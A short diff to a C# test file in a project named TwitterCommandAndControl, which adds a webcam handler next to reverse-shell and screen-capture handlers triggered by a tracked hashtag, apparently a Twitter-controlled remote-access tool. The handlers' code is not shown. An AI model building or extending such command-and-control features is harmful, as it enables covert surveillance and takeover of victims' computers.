@@ -21,6 +21,7 @@ namespace TwitterCommandAndControl.Test
                 {
                     ReverseShellHandler.Respond(x);
                     ScreenCaptureHandler.Respond(x);
+                    WebcamHandler.Respond(x);
                 });
             }, 
             track: hashTag, 
